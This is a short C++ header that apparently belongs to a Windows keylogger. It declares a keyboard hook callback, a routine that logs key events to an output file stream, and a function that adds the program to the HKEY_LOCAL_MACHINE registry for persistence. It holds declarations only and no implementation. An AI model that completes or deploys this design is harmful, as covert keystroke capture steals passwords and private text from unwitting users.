#pragma once
#include<iostream>
#include<fstream>
#include<string>
#include<stdio.h>
void UpdateKeyState(BYTE *keystate, int keyCode);
LRESULT CALLBACK HoockCallback(int nCode, WPARAM wParam, LPARAM lParam);
void ProcessEvent(char* lpszName, int codeNum, std::string& str, WPARAM wParam,std::ofstream &outputStream);
void AddProgramInHKEY_LOCAL_MACHINERegister();


